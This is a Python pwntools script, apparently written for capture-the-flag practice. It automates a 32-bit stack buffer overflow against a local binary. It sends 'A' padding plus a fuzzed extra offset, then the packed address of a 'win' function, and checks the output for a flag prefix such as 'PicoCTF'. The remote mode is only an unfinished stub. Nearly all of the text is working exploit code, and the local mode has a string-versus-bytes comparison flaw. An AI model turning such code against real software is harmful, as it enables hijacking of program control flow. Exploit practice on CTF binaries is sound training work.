#!/usr/bin/python

from pwn import *
import sys

types = ['Local', 'Remote']

class Help:
    def baseHelp():
        print('Usage: ./callWin.py [challege type] [options] [file|ip:port] [win function name] [offset]')
        print('')
        print('Challenge type:')
        print('\tLocal\tLocal challenge with provided binary')
        print('\tRemote\tRemote challenge with provided connection details')
        print('')
        print('For more information about challenge type use:')
        print('./callWin.py [challenge type] --help')
        print('')
    
    def localHelp():
        print('Usage: ./callWin.py Local [filename] [options] [win function name/location] [buffer size]')
        print('')
        print('Filename:')
        print('\tName of the vulnerable binary that is to be targeted')
        print('')
        print('Options:')
        print('\t-n\tSpecify the function name that contains the flag')
        print('\t-a\tSpecify the memory address of the function (Big endian)')
        print('')
        print('Offset:')
        print('\tSpecify the size of the buffer to be overflown')
        print('')

    def remoteHelp():
        print('Usage: ./callWin.py Remote [ip:port] [options] [win function name/location] [buffer size]')
        print('')
        print('Connection information:')
        print('\tProvided IP and port for the challenge if it is remote in ip:port format')
        print('')
        print('Options:')
        print('\t-n\tSpecify the function name that contains the flag')
        print('\t-a\tSpecify the memory address of the function (Big endian)')
        print('')
        print('Offset:')
        print('\tSpecify the size of the buffer to be overflown')
        print('')

class Exploits:
    def localBinary():
        if len(sys.argv) <= 5:
            Help.localHelp()
            exit()
        
        filename = sys.argv[2]
        WIN = sys.argv[4]
        BUF = sys.argv[5]

        b = ELF(filename)

        if sys.argv[3] == '-a':
            WIN = p32(int(WIN, 16))
        elif sys.argv[3] == '-n':
            WIN = p32(b.sym[WIN])
        else:
            Help.localHelp()
            exit()

        wrapper = input('Enter your the flag prefix (ie: "PicoCTF"): ')

        for fuzzVal in range(0, 17):
            PAYLOAD = b'A'*int(BUF) + b'A'*int(fuzzVal) + WIN
            p = process(filename)

            p.recvline()
            p.sendline(PAYLOAD)
            output = p.recvline()

            if wrapper in output:
                print(output)
                exit()
    
    def remoteBinary():
        print('remote')
        
def main():
    if(len(sys.argv) <= 1 or sys.argv[1] not in types):
        Help.baseHelp()
        exit()
    elif(len(sys.argv) <= 2 or sys.argv[2] == '--help'):
        if(sys.argv[1] == 'Local'):
            Help.localHelp()
            exit()
        elif(sys.argv[1] == 'Remote'):
            Help.remoteHelp()
            exit()
    
    if(sys.argv[1] == 'Local'):
        Exploits.localBinary()

    if(sys.argv[1] == 'Remote'):
        Exploits.remoteBinary()

main()
